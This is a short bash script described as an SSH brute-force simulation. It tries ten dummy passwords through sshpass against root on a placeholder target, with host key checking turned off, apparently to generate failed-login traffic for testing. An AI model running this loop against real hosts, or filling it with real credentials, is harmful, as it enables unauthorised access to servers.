#!/bin/bash
# Simple SSH Brute-Force simulation script
TARGET_IP="<IP_OFIARY>"
USER="root"

echo "[*] Starting SSH brute-force simulation against $TARGET_IP..."

for i in {1..10}
do
   echo "Attempt $i..."
   sshpass -p "fake_password_$i" ssh -o StrictHostKeyChecking=no $USER@$TARGET_IP 2>/dev/null
done

echo "[*] Simulation complete."
